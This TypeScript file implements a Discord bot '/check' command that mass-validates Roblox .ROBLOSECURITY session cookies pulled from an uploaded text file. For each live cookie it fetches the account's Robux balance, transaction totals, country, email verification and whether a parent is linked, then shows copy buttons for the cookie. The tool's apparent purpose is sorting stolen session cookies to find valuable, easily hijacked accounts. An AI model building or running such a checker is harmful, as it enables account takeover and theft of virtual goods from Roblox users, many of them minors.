import {
  SlashCommandBuilder,
  PermissionFlagsBits,
  type ChatInputCommandInteraction,
  type MessageComponentInteraction,
  MessageFlags,
} from 'discord.js';
import * as Roblox from '../../lib/roblox-api';
import {
  buildSuccessEmbed,
  buildErrorEmbed,
  buildInvalidCookieEmbed,
  buildIpLimitEmbed,
  buildProgressEmbed,
  buildAccountEmbed,
} from '../../lib/embed-helpers';
import { buildCopyButtons, handleCopyButtonClick } from '../../lib/button-helpers';
import { logger } from '../../lib/logger';
import type { Command } from './types';

function extractCookiesFromLabeled(text: string): string[] {
  const lines = text.split('\n').map(l => l.trim()).filter(Boolean);
  const cookies: string[] = [];
  let currentCookie: string | null = null;

  for (const line of lines) {
    const lower = line.toLowerCase();
    if (lower.startsWith('cookie') && line.includes(':')) {
      const parts = line.split(':');
      if (parts.length >= 2) {
        const value = parts.slice(1).join(':').trim();
        if (value) {
          currentCookie = value;
          cookies.push(currentCookie);
          currentCookie = null;
        }
      }
    }
  }
  return cookies;
}

function extractCookiesRegex(text: string): string[] {
  const FULL_COOKIE_RE = /_\|WARNING:-DO-NOT-SHARE-THIS\.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\.\|_CAEQ[A-Za-z0-9._\-+=\/]+/g;
  const BARE_COOKIE_RE = /CAEQ[A-Za-z0-9._\-+=\/]{50,}/g;
  const fullMatches = [...text.matchAll(FULL_COOKIE_RE)].map((m) => m[0]);
  const fullBareValues = new Set(fullMatches.map((m) => m.slice(m.indexOf('|_CAEQ') + 2)));
  const bareMatches = [...text.matchAll(BARE_COOKIE_RE)]
    .map((m) => m[0])
    .filter((v) => !fullBareValues.has(v));
  const seen = new Set<string>();
  const result: string[] = [];
  for (const full of fullMatches) {
    const bare = full.slice(full.indexOf('|_CAEQ') + 2);
    if (!seen.has(bare)) { seen.add(bare); result.push(full); }
  }
  for (const bare of bareMatches) {
    if (!seen.has(bare)) { seen.add(bare); result.push(bare); }
  }
  return result;
}

function extractCookies(text: string): string[] {
  const trimmed = text.trim();
  if (trimmed.toLowerCase().includes('cookie') && trimmed.includes(':')) {
    const labeled = extractCookiesFromLabeled(trimmed);
    if (labeled.length > 0) {
      return labeled;
    }
  }
  return extractCookiesRegex(trimmed);
}

async function fetchRobux(cookie: string, userId: string): Promise<number> {
  try {
    const resp = await fetch(
      `https://economy.roblox.com/v1/users/${userId}/currency`,
      { headers: { Cookie: `.ROBLOSECURITY=${cookie}` } }
    );
    if (resp.status === 200) {
      const data = (await resp.json()) as { robux: number };
      return data.robux || 0;
    }
  } catch {}
  return 0;
}

async function fetchTransactionTotals(cookie: string, userId: string): Promise<{ incoming: number; outgoing: number }> {
  try {
    const resp = await fetch(
      `https://apis.roblox.com/transaction-records/v1/users/${userId}/transaction-totals?usedTypes=2228224&timeFrame=Year&transactionType=summary`,
      { headers: { Cookie: `.ROBLOSECURITY=${cookie}` } }
    );
    if (resp.status === 200) {
      const data = (await resp.json()) as { incomingRobuxTotal: number; outgoingRobuxTotal: number };
      return { incoming: data.incomingRobuxTotal || 0, outgoing: data.outgoingRobuxTotal || 0 };
    }
  } catch {}
  return { incoming: 0, outgoing: 0 };
}

async function fetchCountry(cookie: string): Promise<string> {
  try {
    const resp = await fetch('https://accountsettings.roblox.com/v1/account/settings/account-country', {
      headers: { Cookie: `.ROBLOSECURITY=${cookie}` },
    });
    if (resp.status === 200) {
      const data = (await resp.json()) as { value: { countryName: string } };
      return data.value?.countryName || 'Unknown';
    }
  } catch {}
  return 'Unknown';
}

async function fetchEmailInfo(cookie: string): Promise<{ verified: string | null; pending: string | null }> {
  try {
    const resp = await fetch('https://accountsettings.roblox.com/v1/email', {
      headers: { Cookie: `.ROBLOSECURITY=${cookie}` },
    });
    if (resp.status === 200) {
      const data = (await resp.json()) as { emailAddress: string; verified: boolean; canBypassPasswordForEmailUpdate: boolean };
      return { verified: data.verified ? data.emailAddress : null, pending: null };
    }
  } catch {}
  return { verified: null, pending: null };
}

async function fetchParentalControls(cookie: string): Promise<{ hasParent: boolean }> {
  try {
    const resp = await fetch('https://apis.roblox.com/parental-controls-api/v1/parental-controls/get-linked-parents', {
      headers: { Cookie: `.ROBLOSECURITY=${cookie}` },
    });
    if (resp.status === 200) {
      const data = (await resp.json()) as { parents: unknown[]; canAddParent: boolean };
      return { hasParent: (data.parents && data.parents.length > 0) || false };
    }
  } catch {}
  return { hasParent: false };
}

async function fetchAvatarThumbnail(userId: string): Promise<string | null> {
  try {
    const resp = await fetch(
      `https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=150x150&format=Png&isCircular=false`,
      { headers: { 'User-Agent': 'Mozilla/5.0' } }
    );
    if (resp.status === 200) {
      const data = (await resp.json()) as { data: { imageUrl: string }[] };
      if (data.data && data.data.length > 0 && data.data[0].imageUrl) {
        return data.data[0].imageUrl;
      }
    }
  } catch {}
  return null;
}

const data = new SlashCommandBuilder()
  .setName('check')
  .setDescription('Mass Checking File')
  .setDefaultMemberPermissions(PermissionFlagsBits.Administrator)
  .addAttachmentOption((opt) =>
    opt.setName('file')
      .setDescription('A .txt file containing cookies (supports labeled format)')
      .setRequired(true),
  ) as SlashCommandBuilder;

async function execute(interaction: ChatInputCommandInteraction): Promise<void> {
  try {
    await interaction.deferReply({ flags: MessageFlags.Ephemeral });

    const attachment = interaction.options.getAttachment('file', true);
    if (!attachment.name?.endsWith('.txt') && !attachment.contentType?.includes('text')) {
      await interaction.editReply({ embeds: [buildErrorEmbed('✧ **Invalid File**\n────\n⭑ Please attach a `.txt` file.')] });
      return;
    }

    let fileContent: string;
    try {
      const resp = await fetch(attachment.url);
      fileContent = await resp.text();
    } catch {
      await interaction.editReply({ embeds: [buildErrorEmbed('✧ **Download Failed**\n────\n⭑ Could not fetch the file.')] });
      return;
    }

    const cookies = extractCookies(fileContent);
    if (cookies.length === 0) {
      await interaction.editReply({ embeds: [buildErrorEmbed('✧ **No Cookies Found**\n────\n⭑ No valid cookie tokens found in the file.')] });
      return;
    }

    const progressEmbed = buildProgressEmbed(`Scanning ${cookies.length} cookie(s)...`);
    await interaction.editReply({ embeds: [progressEmbed] });

    let validCount = 0;
    let totalRobux = 0;

    for (const rawCookie of cookies) {
      const validation = await Roblox.validateCookie(rawCookie);
      if (!validation.valid) continue;

      validCount++;
      const userId = validation.userId!;
      const age = await Roblox.getUserAge(userId);
      const robux = await fetchRobux(rawCookie, String(userId));
      const summary = await fetchTransactionTotals(rawCookie, String(userId));
      const country = await fetchCountry(rawCookie);
      const email = await fetchEmailInfo(rawCookie);
      const parental = await fetchParentalControls(rawCookie);
      const thumb = await fetchAvatarThumbnail(String(userId));
      totalRobux += robux;

      let emailStatus = 'No email';
      if (email.verified) emailStatus = '✅ Verified';
      else if (email.pending) emailStatus = '⏳ Pending';

      const id = Math.random().toString(36).slice(2, 10);
      const row = buildCopyButtons(id, 'check', rawCookie, false);

      const embed = buildAccountEmbed(
        validation.username!,
        validation.displayName || null,
        userId,
        age,
        robux,
        summary,
        country,
        emailStatus,
        parental.hasParent ? '✅ Linked' : '❌ None',
        thumb
      );
      await interaction.followUp({ embeds: [embed], components: [row], flags: MessageFlags.Ephemeral });
    }

    const summaryEmbed = buildSuccessEmbed(
      validCount === 0
        ? `✧ **Results**\n────\n⭑ Checked ${cookies.length} cookie(s)\n⭑ **Valid:** 0\n⭑ All are invalid or expired.`
        : `✧ **Results**\n────\n⭑ Checked ${cookies.length} cookie(s)\n⭑ **Valid:** ${validCount}\n⭑ **Total Robux:** ${totalRobux.toLocaleString()}`
    );
    await interaction.followUp({ embeds: [summaryEmbed], flags: MessageFlags.Ephemeral });
  } catch (err: any) {
    logger.error({ err }, 'Check command error');
    await interaction.editReply({ embeds: [buildErrorEmbed('✧ **Unexpected Error**\n────\n⭑ Something went wrong.')] });
  }
}

async function handleButton(interaction: MessageComponentInteraction): Promise<void> {
  if (await handleCopyButtonClick(interaction)) return;
}

export const checkCommand: Command = { data, execute, handleButton };